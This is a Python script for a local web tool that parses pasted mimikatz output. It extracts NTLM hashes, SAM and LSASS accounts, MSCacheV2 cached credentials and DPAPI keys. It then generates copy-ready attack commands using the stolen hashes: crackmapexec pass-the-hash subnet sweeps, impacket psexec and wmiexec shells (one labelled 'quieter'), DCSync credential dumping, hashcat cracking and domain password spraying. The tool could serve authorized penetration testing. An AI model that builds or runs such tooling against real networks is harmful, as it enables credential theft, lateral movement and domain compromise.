#!/usr/bin/env python3
"""
Mimikatz Output Parser
Run: python3 mimikatz_parser.py
Then browse to: http://127.0.0.1:5000
"""

import re
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

# ── Parser logic ─────────────────────────────────────────────────────────────

def parse_mimikatz(raw: str) -> dict:
    results = {
        "machine": {},
        "sam_accounts": [],
        "lsass_local": [],
        "lsass_domain": [],
        "machine_accounts": [],
        "cached_creds": [],
        "dpapi": None,
        "dcsync_attempted": False,
        "dcsync_failed": False,
        "commands_run": [],
    }

    # Commands detected
    for cmd in ["sekurlsa::logonpasswords", "lsadump::sam", "lsadump::secrets",
                "lsadump::cache", "lsadump::dcsync", "privilege::debug", "token::elevate"]:
        if cmd in raw:
            results["commands_run"].append(cmd)

    if "lsadump::dcsync" in raw:
        results["dcsync_attempted"] = True
    if "ERROR kuhl_m_lsadump_dcsync" in raw:
        results["dcsync_failed"] = True

    # Machine context from lsadump::sam / lsadump::secrets
    m = re.search(r"^Domain : (\w+)", raw, re.MULTILINE)
    if m:
        results["machine"]["hostname"] = m.group(1)

    m = re.search(r"Domain name\s*:\s*(\S+)\s*\(\s*(S-1-5-21-[\d-]+)\s*\)", raw)
    if m:
        results["machine"]["domain"] = m.group(1)
        results["machine"]["domain_sid"] = m.group(2)

    m = re.search(r"Domain FQDN\s*:\s*(\S+)", raw)
    if m:
        results["machine"]["fqdn"] = m.group(1)

    m = re.search(r"Local SID\s*:\s*(S-1-5-21-[\d-]+)", raw)
    if m:
        results["machine"]["local_sid"] = m.group(1)

    # ── sekurlsa::logonpasswords ──────────────────────────────────────────────
    hostname = results["machine"].get("hostname", "")
    auth_blocks = re.split(r"Authentication Id\s*:", raw)
    seen_ntlm = set()

    for block in auth_blocks[1:]:
        user_m  = re.search(r"User Name\s*:\s*(.+)", block)
        dom_m   = re.search(r"Domain\s*:\s*(.+)", block)
        ntlm_m  = re.search(r"\* NTLM\s*:\s*([a-f0-9]{32})", block, re.I)
        sess_m  = re.search(r"Session\s*:\s*(.+)", block)

        if not user_m or not ntlm_m:
            continue

        user    = user_m.group(1).strip()
        domain  = dom_m.group(1).strip() if dom_m else ""
        ntlm    = ntlm_m.group(1).strip().lower()
        session = sess_m.group(1).strip() if sess_m else ""

        if user == "(null)":
            continue
        if domain in ("Window Manager", "Font Driver Host", "NT AUTHORITY"):
            continue

        entry = {"user": user, "domain": domain, "ntlm": ntlm, "session": session}

        if user.endswith("$"):
            if ntlm not in seen_ntlm:
                seen_ntlm.add(ntlm)
                results["machine_accounts"].append(entry)
        elif hostname and domain == hostname:
            key = f"{user}:{ntlm}"
            if key not in seen_ntlm:
                seen_ntlm.add(key)
                results["lsass_local"].append(entry)
        else:
            key = f"{domain}\\{user}:{ntlm}"
            if key not in seen_ntlm:
                seen_ntlm.add(key)
                results["lsass_domain"].append(entry)

    # ── lsadump::sam ─────────────────────────────────────────────────────────
    sam_blocks = re.split(r"RID\s*:", raw)
    for block in sam_blocks[1:]:
        rid_m  = re.search(r"(\w+)\s*\(\d+\)\s*\nUser\s*:\s*(\w+)", block)
        ntlm_m = re.search(r"Hash NTLM:\s*([a-f0-9]{32})", block, re.I)
        aes256 = re.search(r"aes256_hmac\s+\(\d+\)\s*:\s*([a-f0-9]{64})", block, re.I)
        if not rid_m or not ntlm_m:
            continue
        user = rid_m.group(2).strip()
        if user in ("Guest", "DefaultAccount"):
            continue
        results["sam_accounts"].append({
            "user": user,
            "rid": rid_m.group(1).strip(),
            "ntlm": ntlm_m.group(1).strip().lower(),
            "aes256": aes256.group(1).strip() if aes256 else None,
        })

    # ── lsadump::cache ───────────────────────────────────────────────────────
    cache_blocks = re.split(r"\[NL\$", raw)
    for block in cache_blocks[1:]:
        user_m  = re.search(r"User\s*:\s*(\S+)\\(\w+)", block)
        hash_m  = re.search(r"MsCacheV2\s*:\s*([a-f0-9]{32})", block, re.I)
        if not user_m or not hash_m:
            continue
        results["cached_creds"].append({
            "domain": user_m.group(1),
            "user": user_m.group(2).lower(),
            "hash": hash_m.group(1).strip().lower(),
            "formatted": f"$DCC2$10240#{user_m.group(2).lower()}#{hash_m.group(1).strip().lower()}",
        })

    # ── DPAPI ────────────────────────────────────────────────────────────────
    if "DPAPI_SYSTEM" in raw:
        dpapi_m = re.search(r"DPAPI_SYSTEM[\s\S]*?full:\s*([a-f0-9]+)", raw, re.I)
        results["dpapi"] = dpapi_m.group(1) if dpapi_m else "present (full key not parsed)"

    return results


def build_commands(r: dict) -> list:
    cmds = []
    hostname = r["machine"].get("hostname", "<HOST>")
    fqdn     = r["machine"].get("fqdn", r["machine"].get("domain", "<DOMAIN>"))

    # Best local admin hash for PtH
    admin = next((a for a in r["sam_accounts"] if a["user"].lower() == "administrator"), None)
    if not admin and r["sam_accounts"]:
        admin = r["sam_accounts"][0]

    if admin:
        cmds.append({
            "label": "Pass-the-Hash — sweep subnet (crackmapexec)",
            "cmd": f"crackmapexec smb <SUBNET>/24 -u {admin['user']} -H {admin['ntlm']} --local-auth",
            "note": "Replace <SUBNET> with target range e.g. 192.168.1"
        })
        cmds.append({
            "label": "Pass-the-Hash — interactive shell (impacket psexec)",
            "cmd": f"impacket-psexec -hashes :{admin['ntlm']} {admin['user']}@<TARGET_IP>",
            "note": None
        })
        cmds.append({
            "label": "Pass-the-Hash — WMI exec (quieter than psexec)",
            "cmd": f"impacket-wmiexec -hashes :{admin['ntlm']} {admin['user']}@<TARGET_IP>",
            "note": None
        })

    for u in r["lsass_domain"]:
        cmds.append({
            "label": f"Pass-the-Hash — domain user {u['domain']}\\{u['user']}",
            "cmd": f"crackmapexec smb <SUBNET>/24 -u {u['user']} -H {u['ntlm']} -d {u['domain']}",
            "note": "Domain user hash — high value, try DC directly too"
        })

    if r["cached_creds"]:
        cmds.append({
            "label": "Crack MSCacheV2 — rockyou + best64 rule (hashcat mode 2100)",
            "cmd": "hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            "note": "Use the hashes.txt content from the cached creds section above"
        })
        cmds.append({
            "label": "Crack MSCacheV2 — rockyou + dive rule (if best64 fails)",
            "cmd": "hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule",
            "note": None
        })

    if r["dcsync_attempted"] and fqdn:
        hash_arg = f":{admin['ntlm']}" if admin else ":<NTLM>"
        user_arg = admin["user"] if admin else "Administrator"
        cmds.append({
            "label": "DCSync remotely via impacket (no mimikatz needed on box)",
            "cmd": f"impacket-secretsdump -hashes {hash_arg} {user_arg}@<DC_IP> -just-dc-ntlm",
            "note": "Requires DA-level rights"
        })
        cmds.append({
            "label": f"DCSync in mimikatz — corrected FQDN",
            "cmd": f"lsadump::dcsync /domain:{fqdn} /all /csv",
            "note": "Run inside mimikatz after privilege::debug + token::elevate"
        })

    if fqdn:
        cmds.append({
            "label": "Spray cracked password across domain",
            "cmd": f"crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' -d {fqdn}",
            "note": "Fill in after cracking cached creds"
        })

    return cmds


# ── HTML template ─────────────────────────────────────────────────────────────

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mimikatz Parser</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --bg: #0f1117; --surface: #181c25; --surface2: #1e2330;
    --border: #2a3040; --text: #e2e8f0; --muted: #7c8a9e;
    --green: #4ade80; --red: #f87171; --amber: #fbbf24; --blue: #60a5fa;
    --purple: #a78bfa; --mono: 'Courier New', monospace;
  }
  body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 14px; line-height: 1.6; }
  .container { max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem; }
  h1 { font-size: 20px; font-weight: 600; color: var(--green); margin-bottom: 4px; }
  .tagline { color: var(--muted); font-size: 13px; margin-bottom: 1.5rem; }
  textarea {
    width: 100%; min-height: 180px; background: var(--surface); border: 1px solid var(--border);
    border-radius: 6px; color: var(--text); font-family: var(--mono); font-size: 12px;
    padding: 10px 12px; resize: vertical; outline: none;
  }
  textarea:focus { border-color: #3b4a6b; }
  .btn {
    margin-top: 10px; padding: 8px 24px; background: transparent;
    border: 1px solid var(--green); border-radius: 6px; color: var(--green);
    font-size: 13px; font-weight: 500; cursor: pointer;
  }
  .btn:hover { background: rgba(74,222,128,0.08); }
  .btn-copy {
    padding: 3px 10px; font-size: 11px; border: 1px solid var(--border);
    border-radius: 4px; background: transparent; color: var(--muted); cursor: pointer;
  }
  .btn-copy:hover { color: var(--text); border-color: var(--muted); }
  section { margin-top: 2rem; }
  .section-title {
    font-size: 11px; font-weight: 600; letter-spacing: 0.08em;
    text-transform: uppercase; color: var(--muted); margin-bottom: 8px;
    border-bottom: 1px solid var(--border); padding-bottom: 6px;
  }
  .card {
    background: var(--surface); border: 1px solid var(--border);
    border-radius: 6px; padding: 12px 14px; margin-bottom: 6px;
  }
  .row { display: flex; justify-content: space-between; align-items: baseline; gap: 8px; padding: 2px 0; }
  .lbl { color: var(--muted); font-size: 12px; white-space: nowrap; flex-shrink: 0; }
  .val { font-family: var(--mono); font-size: 12px; color: var(--text); text-align: right; word-break: break-all; }
  .badge {
    display: inline-block; font-size: 10px; font-weight: 600; padding: 2px 7px;
    border-radius: 4px; margin-left: 8px; vertical-align: middle;
  }
  .b-green { background: rgba(74,222,128,0.12); color: var(--green); }
  .b-red   { background: rgba(248,113,113,0.12); color: var(--red); }
  .b-amber { background: rgba(251,191,36,0.12);  color: var(--amber); }
  .b-blue  { background: rgba(96,165,250,0.12);  color: var(--blue); }
  .cmd-block {
    background: var(--surface2); border: 1px solid var(--border); border-radius: 6px;
    padding: 10px 12px; margin-bottom: 8px;
  }
  .cmd-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
  .cmd-label { font-size: 11px; color: var(--muted); }
  .cmd-note  { font-size: 11px; color: var(--amber); margin-top: 5px; }
  .cmd-text  { font-family: var(--mono); font-size: 12px; color: var(--green); word-break: break-all; }
  .hash-file {
    background: var(--surface2); border: 1px solid var(--border); border-radius: 6px;
    padding: 10px 12px; font-family: var(--mono); font-size: 12px; color: var(--purple);
    white-space: pre-wrap; word-break: break-all; margin-top: 8px;
  }
  .hash-copy-row { margin-top: 6px; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 8px; margin-bottom: 12px; }
  .metric { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 12px; }
  .metric-label { font-size: 11px; color: var(--muted); margin-bottom: 4px; }
  .metric-val { font-size: 22px; font-weight: 600; color: var(--text); }
  .metric-val.mono { font-size: 13px; font-family: var(--mono); }
  .empty { color: var(--muted); font-style: italic; font-size: 13px; }
  .divider { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
</style>
</head>
<body>
<div class="container">
  <h1>// mimikatz parser</h1>
  <p class="tagline">Paste raw mimikatz output. Extracts credentials, identifies attack paths, generates commands.</p>
  <form method="POST" action="/">
    <textarea name="data" placeholder="Paste mimikatz output here..."></textarea>
    <br>
    <button type="submit" class="btn">Parse output</button>
  </form>

  __RESULTS__

</div>
<script>
document.addEventListener('click', function(e) {
  const btn = e.target.closest('.btn-copy');
  if (!btn) return;
  const targetId = btn.getAttribute('data-target');
  const text = targetId
    ? document.getElementById(targetId).innerText
    : btn.getAttribute('data-copy');
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => {
    const orig = btn.textContent;
    btn.textContent = 'Copied!';
    setTimeout(() => btn.textContent = orig, 1500);
  });
});
</script>
</body>
</html>
"""

def h(s: str) -> str:
    """HTML-escape a string for safe insertion into HTML content."""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def render_results(r: dict, cmds: list) -> str:
    hostname = r["machine"].get("hostname", "—")
    fqdn     = r["machine"].get("fqdn", r["machine"].get("domain", "—"))
    total_ntlm   = len(r["sam_accounts"]) + len(r["lsass_local"]) + len(r["lsass_domain"])
    total_cached = len(r["cached_creds"])

    # All copy payloads stored in a JS map keyed by element id.
    # Nothing sensitive goes into inline onclick attributes.
    copy_map = {}
    uid = [0]

    def copy_id(text: str) -> str:
        uid[0] += 1
        key = f"cp{uid[0]}"
        copy_map[key] = text
        return key

    html = "<section>"

    # Summary
    html += '<div class="section-title">Summary</div>'
    html += '<div class="grid">'
    html += f'<div class="metric"><div class="metric-label">Hostname</div><div class="metric-val mono">{h(hostname)}</div></div>'
    html += f'<div class="metric"><div class="metric-label">Domain / FQDN</div><div class="metric-val mono">{h(fqdn)}</div></div>'
    html += f'<div class="metric"><div class="metric-label">NTLM hashes</div><div class="metric-val">{total_ntlm}</div></div>'
    html += f'<div class="metric"><div class="metric-label">MSCacheV2 hashes</div><div class="metric-val">{total_cached}</div></div>'
    html += "</div>"

    if r["commands_run"]:
        html += f'<div class="card"><div class="row"><span class="lbl">Commands detected</span><span class="val">{h(" · ".join(r["commands_run"]))}</span></div></div>'
    if r["dcsync_attempted"] and r["dcsync_failed"]:
        html += '<div class="card"><div class="row"><span class="lbl">DCSync</span><span class="val" style="color:var(--red)">Failed — FQDN not supplied (see corrected command below)</span></div></div>'
    if r["dpapi"]:
        html += f'<div class="card"><div class="row"><span class="lbl">DPAPI_SYSTEM</span><span class="badge b-blue">present</span></div><div class="row"><span class="lbl">Full key</span><span class="val" style="color:var(--purple)">{h(r["dpapi"])}</span></div></div>'
    html += "</section>"

    html += '<hr class="divider">'

    # SAM accounts
    html += "<section>"
    html += '<div class="section-title">Local accounts — SAM <span class="badge b-green">Pass-the-Hash</span></div>'
    if r["sam_accounts"]:
        for a in r["sam_accounts"]:
            aes = f'<div class="row"><span class="lbl">AES256</span><span class="val">{h(a["aes256"])}</span></div>' if a["aes256"] else ""
            html += f'''<div class="card">
              <div class="row"><span class="lbl">User</span><span class="val">{h(hostname)}\\{h(a["user"])}</span></div>
              <div class="row"><span class="lbl">RID</span><span class="val">{h(a["rid"])}</span></div>
              <div class="row"><span class="lbl">NTLM</span><span class="val">{h(a["ntlm"])}</span></div>
              {aes}
            </div>'''
    else:
        html += '<p class="empty">No SAM accounts parsed (was lsadump::sam run?)</p>'
    html += "</section>"

    # LSASS local
    if r["lsass_local"]:
        html += "<section>"
        html += '<div class="section-title">Local accounts — LSASS <span class="badge b-green">Pass-the-Hash</span></div>'
        for a in r["lsass_local"]:
            html += f'''<div class="card">
              <div class="row"><span class="lbl">User</span><span class="val">{h(a["domain"])}\\{h(a["user"])}</span></div>
              <div class="row"><span class="lbl">NTLM</span><span class="val">{h(a["ntlm"])}</span></div>
              <div class="row"><span class="lbl">Session</span><span class="val">{h(a["session"])}</span></div>
            </div>'''
        html += "</section>"

    # LSASS domain users
    if r["lsass_domain"]:
        html += "<section>"
        html += '<div class="section-title">Domain users — LSASS <span class="badge b-red">High value</span></div>'
        for a in r["lsass_domain"]:
            html += f'''<div class="card">
              <div class="row"><span class="lbl">User</span><span class="val">{h(a["domain"])}\\{h(a["user"])}</span></div>
              <div class="row"><span class="lbl">NTLM</span><span class="val">{h(a["ntlm"])}</span></div>
              <div class="row"><span class="lbl">Session</span><span class="val">{h(a["session"])}</span></div>
            </div>'''
        html += "</section>"

    # Machine accounts
    if r["machine_accounts"]:
        html += "<section>"
        html += '<div class="section-title">Machine accounts <span class="badge b-amber">Silver ticket possible</span></div>'
        for a in r["machine_accounts"]:
            html += f'''<div class="card">
              <div class="row"><span class="lbl">Account</span><span class="val">{h(a["user"])}</span></div>
              <div class="row"><span class="lbl">NTLM</span><span class="val">{h(a["ntlm"])}</span></div>
            </div>'''
        html += "</section>"

    # Cached creds
    html += "<section>"
    html += '<div class="section-title">Cached domain credentials — MSCacheV2 <span class="badge b-amber">Offline crack only — cannot PtH</span></div>'
    if r["cached_creds"]:
        for c in r["cached_creds"]:
            html += f'''<div class="card">
              <div class="row"><span class="lbl">User</span><span class="val">{h(c["domain"])}\\{h(c["user"])}</span></div>
              <div class="row"><span class="lbl">Hash</span><span class="val">{h(c["hash"])}</span></div>
              <div class="row"><span class="lbl">Formatted</span><span class="val" style="color:var(--purple)">{h(c["formatted"])}</span></div>
            </div>'''
        hash_file_content = "\n".join(c["formatted"] for c in r["cached_creds"])
        hf_id = copy_id(hash_file_content)
        html += f'<div class="hash-file" id="{hf_id}">{h(hash_file_content)}</div>'
        html += f'<div class="hash-copy-row"><button class="btn-copy" data-target="{hf_id}">Copy hashes.txt content</button></div>'
    else:
        html += '<p class="empty">No cached credentials found (was lsadump::cache run?)</p>'
    html += "</section>"

    html += '<hr class="divider">'

    # Commands
    html += "<section>"
    html += '<div class="section-title">Next step commands</div>'
    for c in cmds:
        cid = copy_id(c["cmd"])
        note_html = f'<div class="cmd-note">&#9888; {h(c["note"])}</div>' if c["note"] else ""
        html += f'''<div class="cmd-block">
          <div class="cmd-header">
            <span class="cmd-label">{h(c["label"])}</span>
            <button class="btn-copy" data-target="{cid}">Copy</button>
          </div>
          <div class="cmd-text" id="{cid}">{h(c["cmd"])}</div>
          {note_html}
        </div>'''
    html += "</section>"

    # Emit the copy map as a JS object so data-target lookups work for
    # elements whose innerText might include HTML entities
    copy_json = json.dumps(copy_map)
    html += f'<script>const _copyMap = {copy_json};</script>'
    html += '''<script>
document.addEventListener("click", function(e) {
  const btn = e.target.closest(".btn-copy");
  if (!btn) return;
  const tid = btn.getAttribute("data-target");
  const text = _copyMap[tid] !== undefined ? _copyMap[tid]
             : (document.getElementById(tid) ? document.getElementById(tid).innerText : "");
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => {
    const orig = btn.textContent;
    btn.textContent = "Copied!";
    setTimeout(() => btn.textContent = orig, 1500);
  });
});
</script>'''

    return html


# ── HTTP server ───────────────────────────────────────────────────────────────

class Handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # suppress request logs

    def send_page(self, body=""):
        page = HTML_PAGE.replace("__RESULTS__", body)
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(page.encode())

    def do_GET(self):
        self.send_page()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode("utf-8", errors="replace")
        params = parse_qs(body)
        raw    = params.get("data", [""])[0]

        if raw.strip():
            r        = parse_mimikatz(raw)
            cmds     = build_commands(r)
            rendered = render_results(r, cmds)
        else:
            rendered = ""

        self.send_page(rendered)


if __name__ == "__main__":
    host, port = "127.0.0.1", 5000
    server = HTTPServer((host, port), Handler)
    print(f"[*] Mimikatz parser running at http://{host}:{port}")
    print("[*] Press Ctrl+C to stop.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
    
